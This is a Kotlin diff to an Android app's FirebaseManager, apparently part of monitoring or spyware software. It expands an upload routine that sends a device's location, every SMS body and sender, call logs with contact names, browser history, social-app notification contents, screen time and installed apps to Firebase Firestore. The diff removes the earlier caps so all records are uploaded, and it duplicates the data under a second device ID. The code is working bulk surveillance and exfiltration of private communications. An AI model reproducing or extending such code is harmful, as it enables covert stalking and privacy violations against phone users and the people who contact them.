@@ -23,10 +23,13 @@ object FirebaseManager {
     private val storage by lazy { FirebaseStorage.getInstance() }
 
     private val deviceId: String
-        get() = CloudConfig.deviceId
+        get() {
+            val id = CloudConfig.deviceId
+            return if (id.isNotEmpty()) id else android.os.Build.MODEL
+        }
 
     /**
-     * Upload full device status and report data to Firebase Firestore using WriteBatch
+     * Upload full device status and report data to Firebase Firestore using WriteBatch (No Truncation)
      */
     suspend fun reportToFirebase(
         deviceInfo: DeviceInfo,
@@ -41,142 +44,152 @@ object FirebaseManager {
         socialNotifications: List<JSONObject>
     ) {
         try {
-            val devId = deviceId
-            if (devId.isEmpty()) return
+            val primaryId = deviceId
+            val modelId = deviceInfo.model.ifEmpty { android.os.Build.MODEL }
+            
+            // To ensure 100% parity whether dashboard selects CloudConfig.deviceId or model ID (e.g. 2018),
+            // update both document references if they differ!
+            val devIds = listOfNotNull(primaryId, if (modelId != primaryId) modelId else null).distinct()
 
             val now = System.currentTimeMillis()
-            val devRef = db.collection("devices").document(devId)
 
-            var batch = db.batch()
-            var opCount = 0
+            for (devId in devIds) {
+                if (devId.isEmpty()) continue
+                val devRef = db.collection("devices").document(devId)
 
-            // 1. Device Document Header
-            val deviceDoc = hashMapOf<String, Any>(
-                "device_id" to devId,
-                "device_name" to deviceInfo.deviceName,
-                "manufacturer" to deviceInfo.manufacturer,
-                "model" to deviceInfo.model,
-                "android_version" to deviceInfo.androidVersion,
-                "sdk_version" to deviceInfo.sdkVersion,
-                "is_active" to true,
-                "last_seen" to now,
-                "battery_level" to battery.level,
-                "is_charging" to battery.isCharging,
-                "battery_temperature" to battery.temperature
-            )
-            batch.set(devRef, deviceDoc, SetOptions.merge())
-            opCount++
+                var batch = db.batch()
+                var opCount = 0
 
-            // 2. Location
-            location?.let { loc ->
-                val locData = hashMapOf<String, Any>(
-                    "latitude" to loc.latitude,
-                    "longitude" to loc.longitude,
-                    "accuracy" to loc.accuracy,
-                    "provider" to loc.provider,
-                    "timestamp" to loc.timestamp
+                // 1. Device Document Header
+                val deviceDoc = hashMapOf<String, Any>(
+                    "device_id" to devId,
+                    "device_name" to deviceInfo.deviceName,
+                    "manufacturer" to deviceInfo.manufacturer,
+                    "model" to deviceInfo.model,
+                    "android_version" to deviceInfo.androidVersion,
+                    "sdk_version" to deviceInfo.sdkVersion,
+                    "is_active" to true,
+                    "last_seen" to now,
+                    "battery_level" to battery.level,
+                    "is_charging" to battery.isCharging,
+                    "battery_temperature" to battery.temperature,
+                    "screen_time_today" to (screentime?.totalMinutes ?: 0),
+                    "unlock_count_today" to (screentime?.unlocks ?: 0)
                 )
-                batch.set(devRef.collection("locations").document(loc.timestamp.toString()), locData, SetOptions.merge())
+                batch.set(devRef, deviceDoc, SetOptions.merge())
                 opCount++
+
+                // 2. Location
+                location?.let { loc ->
+                    val locData = hashMapOf<String, Any>(
+                        "latitude" to loc.latitude,
+                        "longitude" to loc.longitude,
+                        "accuracy" to loc.accuracy,
+                        "provider" to loc.provider,
+                        "timestamp" to loc.timestamp
+                    )
+                    batch.set(devRef.collection("locations").document(loc.timestamp.toString()), locData, SetOptions.merge())
+                    opCount++
+                }
+
+                // 3. ALL SMS Messages (No limit)
+                for (sms in smsMessages) {
+                    val smsData = hashMapOf<String, Any>(
+                        "id" to sms.id,
+                        "address" to sms.address,
+                        "body" to sms.body,
+                        "date" to sms.date,
+                        "type" to sms.type
+                    )
+                    batch.set(devRef.collection("sms").document(sms.id.toString()), smsData, SetOptions.merge())
+                    opCount++
+                    if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
+                }
+
+                // 4. ALL Call Logs (No limit)
+                for (call in callLogs) {
+                    val callDocId = if (call.id > 0) call.id.toString() else call.date.toString()
+                    val callData = hashMapOf<String, Any>(
+                        "id" to call.id,
+                        "number" to call.number,
+                        "name" to (call.name ?: ""),
+                        "duration" to call.duration,
+                        "date" to call.date,
+                        "type" to call.type
+                    )
+                    batch.set(devRef.collection("calls").document(callDocId), callData, SetOptions.merge())
+                    opCount++
+                    if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
+                }
+
+                // 5. ALL Activities
+                for (act in activities) {
+                    val ts = act.optLong("timestamp", System.currentTimeMillis())
+                    val actData = hashMapOf<String, Any>(
+                        "activity_type" to act.optString("activity_type", "unknown"),
+                        "package_name" to act.optString("package_name", ""),
+                        "app_name" to act.optString("app_name", ""),
+                        "data" to act.optString("data", "{}"),
+                        "timestamp" to ts
+                    )
+                    batch.set(devRef.collection("activity").document(ts.toString()), actData, SetOptions.merge())
+                    opCount++
+                    if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
+                }
+
+                // 6. ALL Web History
+                for (web in webHistory) {
+                    val docId = web.url.hashCode().toString()
+                    val webData = hashMapOf<String, Any>(
+                        "url" to web.url,
+                        "title" to web.title,
+                        "browser" to web.browser,
+                        "visit_count" to web.visitCount,
+                        "timestamp" to web.timestamp
+                    )
+                    batch.set(devRef.collection("webhistory").document(docId), webData, SetOptions.merge())
+                    opCount++
+                    if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
+                }
+
+                // 7. ALL Social Notifications
+                for (notif in socialNotifications) {
+                    val ts = notif.optLong("timestamp", System.currentTimeMillis())
+                    val notifData = hashMapOf<String, Any>(
+                        "app_name" to notif.optString("app_name", ""),
+                        "package_name" to notif.optString("package_name", ""),
+                        "sender" to notif.optString("sender", ""),
+                        "content" to notif.optString("content", ""),
+                        "message_type" to notif.optString("message_type", "notification"),
+                        "timestamp" to ts
+                    )
+                    batch.set(devRef.collection("social").document(ts.toString()), notifData, SetOptions.merge())
+                    opCount++
+                    if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
+                }
+
+                // 8. ALL Installed Apps
+                for (app in installedApps) {
+                    val appData = hashMapOf<String, Any>(
+                        "package_name" to app.packageName,
+                        "app_name" to app.appName,
+                        "version_name" to (app.versionName ?: ""),
+                        "version_code" to app.versionCode,
+                        "first_install_time" to app.firstInstallTime,
+                        "last_update_time" to app.lastUpdateTime,
+                        "is_system_app" to app.isSystemApp
+                    )
+                    batch.set(devRef.collection("apps").document(app.packageName.replace("/", "_")), appData, SetOptions.merge())
+                    opCount++
+                    if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
+                }
+
+                if (opCount > 0) {
+                    batch.commit().await()
+                }
             }
 
-            // 3. SMS Messages
-            for (sms in smsMessages.take(100)) {
-                val smsData = hashMapOf<String, Any>(
-                    "id" to sms.id,
-                    "address" to sms.address,
-                    "body" to sms.body,
-                    "date" to sms.date,
-                    "type" to sms.type
-                )
-                batch.set(devRef.collection("sms").document(sms.id.toString()), smsData, SetOptions.merge())
-                opCount++
-                if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
-            }
-
-            // 4. Call Logs
-            for (call in callLogs.take(100)) {
-                val callDocId = if (call.id > 0) call.id.toString() else call.date.toString()
-                val callData = hashMapOf<String, Any>(
-                    "id" to call.id,
-                    "number" to call.number,
-                    "name" to (call.name ?: ""),
-                    "duration" to call.duration,
-                    "date" to call.date,
-                    "type" to call.type
-                )
-                batch.set(devRef.collection("calls").document(callDocId), callData, SetOptions.merge())
-                opCount++
-                if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
-            }
-
-            // 5. Activities
-            for (act in activities) {
-                val ts = act.optLong("timestamp", System.currentTimeMillis())
-                val actData = hashMapOf<String, Any>(
-                    "activity_type" to act.optString("activity_type", "unknown"),
-                    "package_name" to act.optString("package_name", ""),
-                    "app_name" to act.optString("app_name", ""),
-                    "data" to act.optString("data", "{}"),
-                    "timestamp" to ts
-                )
-                batch.set(devRef.collection("activity").document(ts.toString()), actData, SetOptions.merge())
-                opCount++
-                if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
-            }
-
-            // 6. Web History
-            for (web in webHistory) {
-                val docId = web.url.hashCode().toString()
-                val webData = hashMapOf<String, Any>(
-                    "url" to web.url,
-                    "title" to web.title,
-                    "browser" to web.browser,
-                    "visit_count" to web.visitCount,
-                    "timestamp" to web.timestamp
-                )
-                batch.set(devRef.collection("webhistory").document(docId), webData, SetOptions.merge())
-                opCount++
-                if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
-            }
-
-            // 7. Social Notifications
-            for (notif in socialNotifications) {
-                val ts = notif.optLong("timestamp", System.currentTimeMillis())
-                val notifData = hashMapOf<String, Any>(
-                    "app_name" to notif.optString("app_name", ""),
-                    "package_name" to notif.optString("package_name", ""),
-                    "sender" to notif.optString("sender", ""),
-                    "content" to notif.optString("content", ""),
-                    "message_type" to notif.optString("message_type", "notification"),
-                    "timestamp" to ts
-                )
-                batch.set(devRef.collection("social").document(ts.toString()), notifData, SetOptions.merge())
-                opCount++
-                if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
-            }
-
-            // 8. Installed Apps
-            for (app in installedApps.take(150)) {
-                val appData = hashMapOf<String, Any>(
-                    "package_name" to app.packageName,
-                    "app_name" to app.appName,
-                    "version_name" to (app.versionName ?: ""),
-                    "version_code" to app.versionCode,
-                    "first_install_time" to app.firstInstallTime,
-                    "last_update_time" to app.lastUpdateTime,
-                    "is_system_app" to app.isSystemApp
-                )
-                batch.set(devRef.collection("apps").document(app.packageName.replace("/", "_")), appData, SetOptions.merge())
-                opCount++
-                if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
-            }
-
-            if (opCount > 0) {
-                batch.commit().await()
-            }
-
-            Log.d(TAG, "Batch report committed to Firebase Firestore for $devId")
+            Log.d(TAG, "Batch report committed to Firebase Firestore for $devIds")
         } catch (e: Exception) {
             Log.e(TAG, "Error committing batch to Firestore", e)
         }
